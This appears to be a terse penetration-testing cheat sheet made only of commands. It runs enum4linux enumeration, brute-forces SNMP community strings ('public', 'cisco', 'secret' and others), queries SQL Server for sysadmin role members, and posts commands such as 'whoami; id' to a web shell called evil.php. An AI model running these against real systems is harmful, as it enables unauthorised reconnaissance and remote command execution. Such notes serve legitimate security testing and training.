```bash
enum4linux 1.1.1.1  -v -r -n -o -i
```

```bash
snmpwalk -c public -v1 
```

```bash
snmpwalk -c private -v1 
```

```bash
snmpwalk -c cisco -v1 
```

```bash
snmpwalk -c manager -v1 
```

```bash
snmpwalk -c access -v1 
```

```bash
snmpwalk -c secret -v1 
```

```SQL
SELECT r.name AS role, m.name AS member FROM sys.server_principals r JOIN sys.server_role_members rm ON r.principal_id = rm.role_principal_id JOIN sys.server_principals m ON rm.member_principal_id = m.principal_id WHERE r.name = 'sysadmin';
```

```bash 
curl -X POST -d "cmd=whoami; id" "[http://127.0.0.1/evil.php](http://127.0.0.1/evil.php)"
```

```bash 
curl -d "cmd=ls /home" "[http://127.0.0.1/evil.php](http://127.0.0.1/evil.php)"
```
